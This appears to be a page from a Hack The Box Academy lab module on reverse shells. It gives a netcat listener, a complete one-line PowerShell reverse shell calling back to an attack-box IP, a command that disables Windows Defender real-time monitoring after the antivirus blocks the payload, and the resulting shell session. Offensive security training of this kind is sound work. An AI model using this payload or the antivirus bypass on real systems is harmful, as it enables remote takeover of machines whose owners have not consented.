<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/115/section/1106
// Platform Version: V1
// Module ID: 115
// Module Name: Shells & Payloads
// Module Difficulty: Medium
// Section ID: 1106
// Section Title: Reverse Shells
// Page Title: Hack The Box - Academy
// Page Number: 05
-->

# Reverse Shells

**Module Name:** Shells & Payloads **Page Number:** 05

#### 

#### SHELLS & PAYLOADS

# Reverse Shells

#### Reverse Shell Example

![https://academy.hackthebox.com/storage/modules/115/reverseshell.png](https://academy.hackthebox.com/storage/modules/115/reverseshell.png)

## Hands-on With A Simple Reverse Shell in Windows

#### Server (attack box)

``` shell-session
[!bash!]$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
```

#### Client (target)

``` cmd-session
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### Client (target)

``` cmd-session
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

#### Disable AV

``` powershell-session
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

#### Server (attack box)

``` shell-session
[!bash!]$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.36.68 49674

PS C:\Users\htb-student> whoami
ws01\htb-student
```

# 

# 

#### Questions

####